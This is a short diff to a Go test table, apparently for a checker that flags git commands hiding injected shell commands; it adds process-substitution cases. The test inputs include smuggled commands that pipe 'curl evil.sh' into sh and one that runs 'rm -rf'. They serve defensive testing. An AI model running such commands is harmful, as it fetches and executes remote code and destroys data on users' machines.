@@ -134,6 +134,8 @@ func TestRunUnattestablePassthrough(t *testing.T) {
 		{"dollar substitution", "git log $(curl evil.sh)"},
 		{"backtick substitution", "git status `rm -rf /tmp/x`"},
 		{"carriage return tail", "git status\r curl evil.sh | sh"},
+		{"process substitution input", "git status <(curl https://evil.sh)"},
+		{"process substitution output", "git status && git log > >(sh -c 'curl evil.sh|sh')"},
 	}
 
 	for _, tc := range cases {
